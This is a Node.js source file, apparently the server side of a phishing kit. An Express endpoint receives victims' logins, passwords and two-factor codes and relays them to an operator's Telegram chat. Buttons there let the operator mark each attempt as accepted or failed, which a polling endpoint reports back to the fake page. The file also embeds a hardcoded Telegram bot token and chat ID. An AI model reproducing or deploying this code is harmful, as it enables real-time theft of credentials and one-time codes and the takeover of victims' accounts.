const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');

// Используй переменные окружения для безопасности!
const token = process.env.BOT_TOKEN || '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; 
const adminChatId = '-1003894478662'; 

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());

// Хранилище статусов (в оперативной памяти)
let userStatuses = {}; 

// Лог ошибок бота
bot.on('polling_error', (error) => console.log('Ошибка бота:', error.code));

app.post('/send-data', (req, res) => {
    const { type, email, pass, code, userId } = req.body;
    
    if (!userId) return res.status(400).json({ error: 'No userId provided' });

    userStatuses[userId] = 'pending';

    let message = '';
    if (type === 'auth') {
        message = `⚠️ **Вход**\n👤 Логин: \`${email}\`\n🔑 Пароль: \`${pass}\``;
    } else if (type === '2fa') {
        message = `🔢 **Код 2FA**: \`${code}\``;
    }

    bot.sendMessage(adminChatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Ок', callback_data: `ok_${userId}` },
                { text: '❌ Ошибка', callback_data: `err_${userId}` }
            ]]
        }
    }).catch(err => console.error('Ошибка отправки в TG:', err));

    res.json({ status: 'ok' });
});

bot.on('callback_query', async (query) => {
    const [action, userId] = query.data.split('_');

    userStatuses[userId] = (action === 'ok') ? 'success' : 'error';

    try {
        await bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
        });
    } catch (e) {
        console.error('Ошибка callback:', e);
    }
});

app.get('/check/:userId', (req, res) => {
    const status = userStatuses[req.params.userId] || 'none';
    res.json({ status });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
